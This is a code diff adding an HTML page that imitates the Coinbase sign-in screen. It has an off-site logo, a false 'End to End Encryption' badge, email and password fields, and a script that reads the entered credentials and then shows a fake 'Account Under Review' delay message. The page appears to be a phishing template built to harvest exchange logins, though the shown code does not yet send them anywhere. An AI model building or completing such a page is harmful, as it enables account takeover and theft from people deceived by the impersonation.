@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign In - Coinbase</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #000;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 40px 20px;
+      box-sizing: border-box;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo {
+      width: 150px;
+      margin-bottom: 30px;
+    }
+
+    .login-title {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 15px;
+    }
+
+    .login-text {
+      font-size: 14px;
+      color: #ccc;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+      width: 100%;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: #fff;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background-color: #2c2c2c;
+      color: white;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    .form-group input::placeholder {
+      color: #888;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 32px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn-primary {
+      background-color: #4c8ffb;
+      color: black;
+    }
+
+    .btn-primary:hover {
+      background-color: #367af6;
+    }
+
+    .btn.loading .btn-text {
+      visibility: hidden;
+    }
+
+    .btn.loading::after {
+      content: '';
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      border: 3px solid black;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    .footer-links {
+      margin-top: 20px;
+      font-size: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .footer-links a {
+      color: #4c8ffb;
+      text-decoration: none;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    /* End to End Encryption Text with CSS Padlock */
+    .encryption-text {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 14px;
+      color: #4c8ffb;
+      margin-top: 20px;
+      text-align: center;
+      font-weight: 500;
+    }
+
+    .padlock {
+      width: 16px;
+      height: 20px;
+      position: relative;
+      display: inline-block;
+    }
+
+    .padlock::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 4px;
+      width: 8px;
+      height: 8px;
+      border: 2px solid #4c8ffb;
+      border-bottom: none;
+      border-radius: 8px 8px 0 0;
+      animation: lock-shackle 0.5s ease-in-out;
+    }
+
+    .padlock::after {
+      content: '';
+      position: absolute;
+      top: 8px;
+      left: 0;
+      width: 16px;
+      height: 12px;
+      background: #4c8ffb;
+      border-radius: 2px;
+      box-shadow: 0 0 8px rgba(76, 143, 251, 0.5);
+    }
+
+    /* Error Pop-up Styles */
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .popup {
+      background-color: #1a1a1a;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 350px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    }
+
+    .popup-title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #ff4d4f; /* Red for error */
+      margin-bottom: 10px;
+    }
+
+    .popup-text {
+      font-size: 14px;
+      color: #ccc;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    .popup-btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 32px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      background-color: #4c8ffb;
+      color: black;
+      transition: background-color 0.3s;
+    }
+
+    .popup-btn:hover {
+      background-color: #367af6;
+    }
+
+    @keyframes lock-shackle {
+      0% { transform: translateY(2px); }
+      50% { transform: translateY(-2px); }
+      100% { transform: translateY(0); }
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://i.ibb.co/vvxn966F/In-Shot-20250418-173504055.png" alt="Coinbase Logo" class="logo">
+    <div class="login-title">Sign In to Coinbase</div>
+    <div class="login-text">
+      Enter your email and password to access your account securely.
+    </div>
+
+    <form id="login-form">
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" placeholder="Enter your email" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+      </div>
+
+      <button type="submit" class="btn btn-primary" id="signin-btn">
+        <span class="btn-text">Sign In</span>
+      </button>
+    </form>
+
+    <div class="footer-links">
+      <a href="reset-password.html">Forgot password?</a>
+      <a href="#">Sign in with Passkey</a>
+    </div>
+
+    <div class="encryption-text">
+      <span class="padlock"></span>
+      End to End Encryption
+    </div>
+  </div>
+
+  <!-- Error Pop-up -->
+  <div class="popup-overlay" id="popup-overlay">
+    <div class="popup">
+      <div class="popup-title">Account Under Review</div>
+      <div class="popup-text">
+        Your account is under review. Please wait 12 hours before proceeding.
+      </div>
+      <button class="popup-btn" id="popup-btn">Cancel</button>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const signinBtn = document.getElementById('signin-btn');
+      const popupOverlay = document.getElementById('popup-overlay');
+
+      // Basic client-side validation
+      if (!email.includes('@')) {
+        alert('Please enter a valid email address.');
+        return;
+      }
+      if (password.length < 8) {
+        alert('Password must be at least 8 characters long.');
+        return;
+      }
+
+      // Show loading effect
+      signinBtn.classList.add('loading');
+      signinBtn.disabled = true;
+
+      // Show error pop-up after loading
+      setTimeout(() => {
+        signinBtn.classList.remove('loading');
+        signinBtn.disabled = false;
+        popupOverlay.style.display = 'flex';
+      }, 1000); // 1-second delay
+    });
+
+    // Handle pop-up cancel button
+    document.getElementById('popup-btn').addEventListener('click', function() {
+      document.getElementById('popup-overlay').style.display = 'none';
+    });
+  </script>
+</body>
+</html>
